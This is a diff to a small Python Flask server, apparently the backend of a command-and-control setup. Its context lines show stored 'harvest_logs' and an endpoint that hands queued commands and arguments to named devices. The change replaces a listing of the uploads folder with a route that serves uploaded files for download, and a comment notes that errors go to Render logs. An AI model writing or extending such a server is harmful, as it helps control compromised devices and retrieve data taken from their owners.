@@ -3,7 +3,7 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
-UPLOAD_FOLDER = 'uploads'
+UPLOAD_FOLDER = os.path.abspath('uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 harvest_logs = []
 device_commands = {}
@@ -95,10 +95,15 @@ def command(device):
         return jsonify({'cmd': command[0], 'arg': command[1]})
     else:
         return jsonify({'cmd': 'noop', 'arg': ''})
-@app.route('/list_uploads')
-def list_uploads():
-    files = os.listdir(UPLOAD_FOLDER)
-    return "<h2>Files in uploads/:</h2>" + "<br>".join(files)
+from flask import send_from_directory, abort
+
+@app.route('/uploads/<path:filename>')
+def files(filename):
+    try:
+        return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
+    except Exception as e:
+        print(f"Error serving file {filename}: {e}")   # This prints to Render logs!
+        return f"Failed to serve file: {e}", 500
     
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
